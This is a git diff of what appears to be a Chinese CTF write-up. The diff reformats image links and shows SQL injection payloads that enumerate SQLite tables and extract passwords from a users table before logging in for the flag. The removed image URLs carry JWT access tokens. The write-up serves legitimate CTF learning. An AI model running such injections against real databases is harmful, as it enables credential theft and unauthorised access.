@@ -186,7 +186,17 @@ print('{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '"
 1'+union+select+(select+name+from+sqlite_master+where+type%3d'table'+limit+0,1)+—
 ```
 
-![img](https://uploader.shimo.im/f/68HxBO3bcJjUMNNB.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c)查出password`1'+union+select+(select+password+from+users)+—`![img](https://uploader.shimo.im/f/S2Y9fE1whe6cBXyv.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c)登录获取flag ![img](https://uploader.shimo.im/f/RsRLRpWZH7RC2fsZ.png!thumbnail?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2NjcxODY5NjEsImZpbGVHVUlEIjoiUktBV1Z4V0VKYUhqVkRrOCIsImlhdCI6MTY2NzE4NjY2MSwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjo1NjA1NzEyMX0.ovtkz6qCfUXuSVE9j9CUtkFzMfsmeGEeYuAutgwgt8c)
+![image-20221031124115476](https://tuchuang.huamang.xyz/img/image-20221031124115476.png)
+
+查出password`1'+union+select+(select+password+from+users)+—`
+
+![image-20221031124138020](https://tuchuang.huamang.xyz/img/image-20221031124138020.png)
+
+登录获取flag 
+
+![image-20221031124148049](https://tuchuang.huamang.xyz/img/image-20221031124148049.png)
+
+
 
 # Misc
 
